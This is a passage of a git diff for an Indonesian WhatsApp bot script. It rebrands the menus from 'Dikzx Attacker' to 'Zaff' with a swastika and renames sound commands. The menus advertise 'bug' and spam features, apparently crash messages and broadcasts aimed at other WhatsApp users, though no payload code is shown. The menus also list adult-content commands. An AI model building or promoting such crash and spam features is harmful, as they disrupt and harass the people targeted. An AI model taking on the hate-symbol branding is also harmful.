+╠➤𝐳𝐚𝐟𝐟𝐤𝐚𝐧𝐠𝐛𝐮𝐠 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐤𝐚𝐧𝐠𝐛𝐮𝐠𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐛𝐚𝐫 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐨𝐤𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐞𝐰𝐞 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝐧𝐠𝐞𝐧𝐭𝐨𝐝 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟑 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟒 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟓 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟔 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟕 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟖 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟗 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟎 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟏 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
+╠➤𝐳𝐚𝐟𝐟𝟏𝟐 [ 𝐣𝐮𝐦𝐥𝐚𝐡 ]
 ╠➤𝐬𝐩𝐚𝐦 [ 𝐑𝐞𝐩𝐥𝐲 𝐏𝐞𝐬𝐚𝐧 ]
-╚════[ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐉𝐀𝐃𝐈 𝐁𝐔𝐆 ]══════⊱
@@ -4934,7 +4934,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟑 [ 𝐑𝐞𝐩𝐥𝐲 𝐀𝐮𝐝𝐢𝐨 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐕𝐧 ]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟒 [ 𝐑𝐞𝐩𝐥𝐲 𝐒𝐭𝐢𝐜𝐤𝐞𝐫 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐆𝐚𝐦𝐛𝐚𝐫 ]
 ╠➤𝐣𝐚𝐝𝐢𝐛𝐮𝐠𝟓 [ 𝐑𝐞𝐩𝐥𝐲 𝐆𝐚𝐦𝐛𝐚𝐫 𝐉𝐚𝐝𝐢 𝐁𝐮𝐠 𝐎𝐧𝐜𝐞 ] 
-╚════[ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢]══════⊱
+╚════[ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢]══════⊱
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 
 ╔══════[ 𝐁𝐔𝐆 𝐁𝐑𝐎𝐀𝐃𝐂𝐀𝐒𝐓 ]══════⊱
@@ -4942,8 +4942,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ╠➤𝐛𝐮𝐠𝐛𝐜𝐯𝐢𝐝𝐞𝐨 [ 𝐁𝐮𝐠 𝐕𝐢𝐝𝐞𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬 ]
 ╠➤𝐛𝐮𝐠𝐛𝐜 𝐚𝐮𝐝𝐢𝐨 [ 𝐁𝐮𝐠 𝐀𝐮𝐝𝐢𝐨 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 ]
 ╠➤𝐛𝐮𝐠𝐛𝐜𝐭𝐞𝐱𝐭 [ 𝐁𝐮𝐠 𝐓𝐞𝐱𝐭 𝐁𝐫𝐨𝐚𝐝𝐜𝐚𝐬𝐭 ]
-╚════[ ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -4962,7 +4962,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "productImage": messa.imageMessage,
 "productId": "449756950375071",
 "title": ` © Hay Kak ${pushname} 👋 Selamat ${salam} Apa Yang Bisa Saya Bantu 🙏`,
-"description": ` - © © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ -
+"description": ` - © © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ -
 
 ◎ Owner : ${botname}
 ◎ Lib : Multi-Device
@@ -4975,7 +4975,7 @@ SILAHKAN KETIK MENU UNTUK MENGGUNAKAN BOT LEBIB LANJUT ✌️`,
 "productImageCount": 1,
 "firstImageId": 1,
 "salePriceAmount1000": "10000000",
-"retailerId": `© © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
+"retailerId": `© © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ WE ARE NOT MASTOD`,
 "url": "Wa.me/6285714170944"
 },
 "businessOwnerJid": "6285714170944@s.whatsapp.net",
@@ -5001,8 +5001,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤cantik
 ╠➤kesel
 ╠➤ngeselin
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5037,8 +5037,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤heleh
 ╠➤holoh
 ╠➤delttt]
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5082,8 +5082,8 @@ nomorhoki
 ╠➤masasubur
 ╠➤zodiak
 ╠➤shio
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5101,8 +5101,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤alquran
 ╠➤juzamma
 ╠➤tafsirsurah
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5131,8 +5131,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤antara-news
 ╠➤cnn-news
 ╠➤fajar-news
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱ `,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱ `,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5169,8 +5169,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤getpic
 ╠➤penjara
 ╠➤intro
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5195,8 +5195,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤robot
 ╠➤slow
 ╠➤tupai
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5211,7 +5211,7 @@ if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
  *[ 🌷 ] Asupan Mata* 
 bokep`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5231,8 +5231,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤wikimedia [query]
 ╠➤ringtone [query]
 ╠➤searchgroups [query]
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5264,8 +5264,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤styletext
 ╠➤smeme
 ╠➤ss [url]
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5283,8 +5283,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤listcmd
 ╠➤delcmd
 ╠➤lockcmd
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5300,7 +5300,7 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 *[ 🌷 ] Download Menu* 
 pinterestdl [url]
 mediafire [url]`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5334,8 +5334,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤listgc
 ╠➤listonline
 ╠➤speedtest
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5372,8 +5372,8 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╠➤darkjoke
 ╠➤meme
 ╠➤meme2
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╚════[ © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
+contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»Zaff卐«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
 previewType: "PHOTO",
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
@@ -5388,169 +5388,169 @@ case 'randomsound': {
 if (isBan) throw sticBanLu(from)
 haikal.sendMessage(m.chat, { image: kalimage, caption: `
 ╔══════[ Sound Menu ]══════⊱
-╠➤dikzxsound1
-╠➤dikzxsound2
-╠➤dikzxsound3
-╠➤dikzxsound4
-╠➤dikzxsound5
-╠➤dikzxsound6
-╠➤dikzxsound7
-╠➤dikzxsound8
-╠➤dikzxsound9
-╠➤dikzxsound10
-╠➤dikzxsound11
-╠➤dikzxsound12
-╠➤dikzxsound13
-╠➤dikzxsound14
-╠➤dikzxsound15
-╠➤dikzxsound16
-╠➤dikzxsound17
-╠➤dikzxsound18
-╠➤dikzxsound19
-╠➤dikzxsound20
-╠➤dikzxsound21
-╠➤dikzxsound22
-╠➤dikzxsound23
-╠➤dikzxsound24
-╠➤dikzxsound25
-╠➤dikzxsound26
-╠➤dikzxsound27
-╠➤dikzxsound28
-╠➤dikzxsound29
-╠➤dikzxsound30
-╠➤dikzxsound31
-╠➤dikzxsound32
-╠➤dikzxsound33
-╠➤dikzxsound34
-╠➤dikzxsound35
-╠➤dikzxsound36
-╠➤dikzxsound37
-╠➤dikzxsound38
-╠➤dikzxsound39
-╠➤dikzxsound40
-╠➤dikzxsound41
-╠➤dikzxsound42
-╠➤dikzxsound43
-╠➤dikzxsound44
-╠➤dikzxsound45
-╠➤dikzxsound46
-╠➤dikzxsound47
-╠➤dikzxsound48
-╠➤dikzxsound49
-╠➤dikzxsound50
-╠➤dikzxsound51
-╠➤dikzxsound52
-╠➤dikzxsound53
-╠➤dikzxsound54
-╠➤dikzxsound55
-╠➤dikzxsound56
-╠➤dikzxsound57
-╠➤dikzxsound58
-╠➤dikzxsound59
-╠➤dikzxsound60
-╠➤dikzxsound61
-╠➤dikzxsound62
-╠➤dikzxsound63
-╠➤dikzxsound64
-╠➤dikzxsound65
-╠➤dikzxsound66
-╠➤dikzxsound67
-╠➤dikzxsound68
-╠➤dikzxsound69
-╠➤dikzxsound70
-╠➤dikzxsound71
-╠➤dikzxsound72
-╠➤dikzxsound73
-╠➤dikzxsound74
-╠➤dikzxsound75
-╠➤dikzxsound76
-╠➤dikzxsound77
-╠➤dikzxsound78
-╠➤dikzxsound79
-╠➤dikzxsound80
-╠➤dikzxsound81
-╠➤dikzxsound82
-╠➤dikzxsound83
-╠➤dikzxsound84
-╠➤dikzxsound85
-╠➤dikzxsound86
-╠➤dikzxsound87
-╠➤dikzxsound88
-╠➤dikzxsound89
-╠➤dikzxsound90
-╠➤dikzxsound91
-╠➤dikzxsound92
-╠➤dikzxsound93
-╠➤dikzxsound94
-╠➤dikzxsound95
-╠➤dikzxsound96
-╠➤dikzxsound97
-╠➤dikzxsound98
-╠➤dikzxsound99
-╠➤dikzxsound100
-╠➤dikzxsound101
-╠➤dikzxsound102
-╠➤dikzxsound103
-╠➤dikzxsound104
-╠➤dikzxsound105
-╠➤dikzxsound106
-╠➤dikzxsound107
-╠➤dikzxsound108
-╠➤dikzxsound109
-╠➤dikzxsound110
-╠➤dikzxsound111
-╠➤dikzxsound112
-╠➤dikzxsound113
-╠➤dikzxsound114
-╠➤dikzxsound115
-╠➤dikzxsound116
-╠➤dikzxsound117
-╠➤dikzxsound118
-╠➤dikzxsound119
-╠➤dikzxsound120
-╠➤dikzxsound121
-╠➤dikzxsound122
-╠➤dikzxsound123
-╠➤dikzxsound124
-╠➤dikzxsound125
-╠➤dikzxsound126
-╠➤dikzxsound127
-╠➤dikzxsound128
-╠➤dikzxsound129
-╠➤dikzxsound130
-╠➤dikzxsound131
-╠➤dikzxsound132
-╠➤dikzxsound133
-╠➤dikzxsound134
-╠➤dikzxsound135
-╠➤dikzxsound136
-╠➤dikzxsound137
-╠➤dikzxsound138
-╠➤dikzxsound139
-╠➤dikzxsound140
-╠➤dikzxsound141
-╠➤dikzxsound142
-╠➤dikzxsound143
-╠➤dikzxsound144
-╠➤dikzxsound145
-╠➤dikzxsound146
-╠➤dikzxsound147
-╠➤dikzxsound148
-╠➤dikzxsound149
-╠➤dikzxsound150
-╠➤dikzxsound151
-╠➤dikzxsound152
-╠➤dikzxsound153
-╠➤dikzxsound154
-╠➤dikzxsound155
-╠➤dikzxsound156
-╠➤dikzxsound157
-╠➤dikzxsound158
-╠➤dikzxsound159
-╠➤dikzxsound160
-╠➤dikzxsound161
-╚════[ © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢ ]══════⊱`,
-contextInfo:{"externalAdReply": {"title": `SC © ꪶ⸸⁶⁶⁶»𝐃𝐢𝐤𝐳𝐱 𝐀𝐭𝐭𝐚𝐜𝐤𝐞𝐫«⁶⁶⁶⸸ꫂ͢`,"body": `Selamat ${salam} kak ${pushname}`,
+╠➤zaffsound1
+╠➤zaffsound2
+╠➤zaffsound3
+╠➤zaffsound4
+╠➤zaffsound5
+╠➤zaffsound6
+╠➤zaffsound7
+╠➤zaffsound8
+╠➤zaffsound9
+╠➤zaffsound10
+╠➤zaffsound11
+╠➤zaffsound12
+╠➤zaffsound13
+╠➤zaffsound14
+╠➤zaffsound15
+╠➤zaffsound16
+╠➤zaffsound17
+╠➤zaffsound18
+╠➤zaffsound19
+╠➤zaffsound20
+╠➤zaffsound21
+╠➤zaffsound22
+╠➤zaffsound23
+╠➤zaffsound24
+╠➤zaffsound25
+╠➤zaffsound26
+╠➤zaffsound27
+╠➤zaffsound28
+╠➤zaffsound29
+╠➤zaffsound30
+╠➤zaffsound31
+╠➤zaffsound32
+╠➤zaffsound33
+╠➤zaffsound34
+╠➤zaffsound35
+╠➤zaffsound36
+╠➤zaffsound37
+╠➤zaffsound38
+╠➤zaffsound39
+╠➤zaffsound40
+╠➤zaffsound41
+╠➤zaffsound42
+╠➤zaffsound43
+╠➤zaffsound44
+╠➤zaffsound45
+╠➤zaffsound46
+╠➤zaffsound47
+╠➤zaffsound48
+╠➤zaffsound49
+╠➤zaffsound50
+╠➤zaffsound51
+╠➤zaffsound52
+╠➤zaffsound53
+╠➤zaffsound54
+╠➤zaffsound55
+╠➤zaffsound56
+╠➤zaffsound57
+╠➤zaffsound58
+╠➤zaffsound59
+╠➤zaffsound60
+╠➤zaffsound61
+╠➤zaffsound62
+╠➤zaffsound63
+╠➤zaffsound64
+╠➤zaffsound65
+╠➤zaffsound66
+╠➤zaffsound67
+╠➤zaffsound68
+╠➤zaffsound69
+╠➤zaffsound70
+╠➤zaffsound71
+╠➤zaffsound72
+╠➤zaffsound73
+╠➤zaffsound74
+╠➤zaffsound75
+╠➤zaffsound76
+╠➤zaffsound77
+╠➤zaffsound78
+╠➤zaffsound79
+╠➤zaffsound80
+╠➤zaffsound81
+╠➤zaffsound82
+╠➤zaffsound83
+╠➤zaffsound84
+╠➤zaffsound85
+╠➤zaffsound86
+╠➤zaffsound87
+╠➤zaffsound88
+╠➤zaffsound89
+╠➤zaffsound90
+╠➤zaffsound91
+╠➤zaffsound92
+╠➤zaffsound93
+╠➤zaffsound94
+╠➤zaffsound95
+╠➤zaffsound96
+╠➤zaffsound97
+╠➤zaffsound98
+╠➤zaffsound99
+╠➤zaffsound100
+╠➤zaffsound101
+╠➤zaffsound102
+╠➤zaffsound103
+╠➤zaffsound104
+╠➤zaffsound105
+╠➤zaffsound106
+╠➤zaffsound107
+╠➤zaffsound108
+╠➤zaffsound109
+╠➤zaffsound110
+╠➤zaffsound111
+╠➤zaffsound112
+╠➤zaffsound113
+╠➤zaffsound114
+╠➤zaffsound115
+╠➤zaffsound116
+╠➤zaffsound117
+╠➤zaffsound118
+╠➤zaffsound119
+╠➤zaffsound120
+╠➤zaffsound121
+╠➤zaffsound122
+╠➤zaffsound123
+╠➤zaffsound124
+╠➤zaffsound125
+╠➤zaffsound126
+╠➤zaffsound127
+╠➤zaffsound128
+╠➤zaffsound129
+╠➤zaffsound130
+╠➤zaffsound131
+╠➤zaffsound132
+╠➤zaffsound133
+╠➤zaffsound134
